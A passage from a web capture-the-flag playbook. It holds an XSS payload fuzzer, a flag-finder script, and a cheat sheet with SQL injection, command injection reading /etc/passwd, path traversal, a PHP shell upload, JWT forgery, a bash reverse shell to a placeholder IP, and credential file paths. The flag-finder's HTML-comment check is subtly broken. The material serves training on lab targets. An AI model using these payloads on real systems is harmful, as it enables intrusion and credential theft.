    "<svg onload=alert(1)>"
    "'-alert(1)-'"
    '"><script>alert(1)</script>'
    "<body onload=alert(1)>"
    "<iframe src=javascript:alert(1)>"
    "<input onfocus=alert(1) autofocus>"
)

for payload in "${PAYLOADS[@]}"; do
    encoded=$(printf %s "$payload" | jq -sRr @uri)
    response=$(curl -s "$TARGET?$PARAM=$encoded")
    
    if echo "$response" | grep -q "$payload"; then
        echo "[!] Reflected XSS found: $payload"
    fi
done

echo "[*] Fuzzing complete"
```

### Script 5: Automatic Flag Finder
```python
#!/usr/bin/env python3
# flag_finder.py

import re
import requests
from bs4 import BeautifulSoup
import base64

def find_flags(url):
    print(f"[*] Searching for flags in {url}")
    
    # Common flag patterns
    patterns = [
        r'flag\{[^\}]+\}',
        r'FLAG\{[^\}]+\}',
        r'CTF\{[^\}]+\}',
        r'[a-f0-9]{32}',  # MD5 hash
        r'[A-Za-z0-9+/=]{20,}',  # Base64
    ]
    
    try:
        r = requests.get(url, timeout=10)
        
        # Check response body
        for pattern in patterns:
            matches = re.findall(pattern, r.text)
            if matches:
                print(f"[+] Found in body: {matches}")
        
        # Check headers
        for header, value in r.headers.items():
            for pattern in patterns:
                matches = re.findall(pattern, str(value))
                if matches:
                    print(f"[+] Found in header {header}: {matches}")
        
        # Check cookies
        for cookie in r.cookies:
            decoded = base64.b64decode(cookie.value + '==').decode('utf-8', errors='ignore')
            for pattern in patterns:
                matches = re.findall(pattern, decoded)
                if matches:
                    print(f"[+] Found in cookie {cookie.name}: {matches}")
        
        # Check HTML comments
        soup = BeautifulSoup(r.text, 'html.parser')
        comments = soup.find_all(string=lambda text: isinstance(text, Comment))
        for comment in comments:
            for pattern in patterns:
                matches = re.findall(pattern, str(comment))
                if matches:
                    print(f"[+] Found in comment: {matches}")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: ./flag_finder.py http://target")
        sys.exit(1)
    
    from html.parser import HTMLParser
    from html.parser import HTMLParser
    class Comment:
        pass
    
    find_flags(sys.argv[1])
```

---

## 📚 Cheat Sheet Reference

### Quick Command Reference

```bash
# === RECON ===
gobuster dir -u $TARGET -w /usr/share/wordlists/dirb/common.txt
nikto -h $TARGET
nmap -p- -A $TARGET

# === SQL INJECTION ===
sqlmap -u "$TARGET?id=1" --batch --dbs
sqlmap -u "$TARGET?id=1" -D db_name -T table_name --dump

# === XSS TESTING ===
curl "$TARGET/search?q=<script>alert(1)</script>"

# === COMMAND INJECTION ===
curl "$TARGET/ping" -d "host=127.0.0.1;cat /etc/passwd"

# === FILE UPLOAD ===
curl -F "file=@shell.php" $TARGET/upload

# === JWT ATTACKS ===
python3 -c "import jwt; print(jwt.encode({'user':'admin'}, '', algorithm='none'))"

# === COOKIE MANIPULATION ===
curl -b "admin=true" $TARGET/admin

# === PATH TRAVERSAL ===
curl "$TARGET/download?file=../../../../etc/passwd"

# === REVERSE SHELL ===
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

### Burp Suite Shortcuts

```
Ctrl+R     - Send to Repeater
Ctrl+I     - Send to Intruder
Ctrl+Shift+R - Send to Repeater (multiple)
Ctrl+E     - Send to Extensions
Ctrl+F     - Search
Ctrl+T     - Send to Comparer
Ctrl+Space - Autocomplete
```

### Important File Locations

```bash
# Linux
/etc/passwd
/etc/shadow
/var/www/html/config.php
/var/log/apache2/access.log
/proc/self/environ
~/.ssh/id_rsa
~/.bash_history

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\xampp\htdocs\config.php
C:\inetpub\wwwroot\web.config
```

### Common Wordlists

```bash
# Directories
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Passwords
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt

# SQL Injection
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt

# XSS
/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt

# Subdomains
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

## 🎓 Practice Resources

### Online CTF Platforms
1. **HackTheBox** - https://www.hackthebox.eu
2. **TryHackMe** - https://tryhackme.com
3. **PentesterLab** - https://pentesterlab.com
4. **PortSwigger Web Security Academy** - https://portswigger.net/web-security
5. **PicoCTF** - https://picoctf.org
6. **OverTheWire** - https://overthewire.org/wargames/natas/

### Vulnerable Web Apps (Local Practice)
```bash
# DVWA (Damn Vulnerable Web Application)
docker run -d -p 80:80 vulnerables/web-dvwa

# bWAPP
docker run -d -p 8080:80 raesene/bwapp

# WebGoat
docker run -d -p 8080:8080 webgoat/webgoat

# Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# Mutillidae
docker run -d -p 80:80 citizenstig/nowasp
```

---

## ⚡ Pro Tips

### 1. Always Use Burp Suite
Even if you think you don't need it, proxy everything through Burp. You'll often find hidden parameters or unusual behavior.

### 2. Look at the Obvious First
Sometimes the flag is literally in:
- HTML comments
- Cookie values (base64 encoded)
- HTTP headers
- robots.txt
- Source code of included JS files

### 3. Read Error Messages Carefully
Error messages often leak:
- Database structure
- File paths
- Technology stack
- SQL query syntax

### 4. Test EVERYTHING
Every parameter, every cookie, every header. Don't assume anything is safe.

### 5. Think Outside the Box
CTF creators love to twist common vulnerabilities:
- SQL injection in Cookie header
- XSS in Referer header
- Command injection in User-Agent
- IDOR in JWT token ID field

### 6. Keep Notes
Document everything you try. Use a tool like:
```bash
# Create organized notes
mkdir -p ~/ctf/challenge_name/{recon,exploits,notes}
script ~/ctf/challenge_name/notes/session_$(date +%Y%m%d_%H%M%S).log
```

### 7. Time Management
Spend:
- 20% on recon
- 50% on vulnerability discovery
- 30% on exploitation

### 8. Use the Community
If stuck for >2 hours:
- Search for similar CTF writeups
- Check CTFtime.org for hints
- Ask in Discord/IRC channels (without spoilers)

### 9. Create Your Own Wordlists
Build custom wordlists from:
- Target website content
- Common words in the challenge description
- Technology-specific terms

```bash
# Extract words from website
cewl $TARGET -m 5 -w custom_wordlist.txt
```

### 10. Master One Tool at a Time
Don't try to learn everything. Master:
- Burp Suite first
- Then sqlmap
- Then one scripting language (Python)
- Gradually expand

---

## 🔧 Final Setup Checklist

Before starting any CTF:

```bash
# 1. Update system
sudo apt update && sudo apt upgrade -y

# 2. Start required services
sudo systemctl start postgresql  # For sqlmap
sudo systemctl start apache2     # For hosting payloads

# 3. Set up working directory
mkdir -p ~/ctf/$(date +%Y%m%d)/{recon,exploits,loot,notes}
cd ~/ctf/$(date +%Y%m%d)

# 4. Start Burp Suite
burpsuite &

# 5. Start logger
script notes/session.log

# 6. Set target variable
export TARGET="http://target-ip:port"

# 7. Start simple HTTP server (for receiving shells/data)
python3 -m http.server 8000 &

# 8. Start netcat listener (for reverse shells)
nc -lvnp 4444 &

# Now you're ready! 🚀
```

---

## 📖 Conclusion

This playbook covers 90% of web CTF challenges you'll encounter. Remember:

1. **Reconnaissance is key** - Spend time understanding the target
2. **Be methodical** - Follow the checklist, don't skip steps
3. **Think like an attacker** - How can this be abused?
4. **Practice regularly** - Solve at least one challenge per day
5. **Learn from failures** - Every failed attempt teaches something
6. **Read writeups** - After solving, see how others did it
7. **Stay updated** - New techniques emerge constantly

### Next Steps
1. Set up your Kali environment with all tools
2. Practice on DVWA with each vulnerability type
3. Join a CTF platform and start with "Easy" challenges
4. Create your own notes and expand this playbook
5. Participate in live CTF competitions

**Happy Hacking! 🎯**

---

*Remember: Only practice these techniques on authorized systems. Unauthorized access is illegal.*

*Created for educational purposes only.*
